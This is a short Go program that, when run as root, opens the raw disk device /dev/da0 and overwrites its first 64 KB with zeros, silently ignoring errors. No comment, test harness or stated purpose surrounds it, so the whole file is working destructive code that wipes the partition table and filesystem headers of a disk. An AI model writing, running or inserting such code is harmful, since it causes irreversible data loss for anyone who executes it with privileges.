package main
import ("os")
func main() {
	if os.Geteuid() != 0 { return }
	f, _ := os.OpenFile("/dev/da0", os.O_RDWR, 0)
	if f == nil { return }
	defer f.Close()
	_, _ = f.Write(make([]byte, 65536))
}
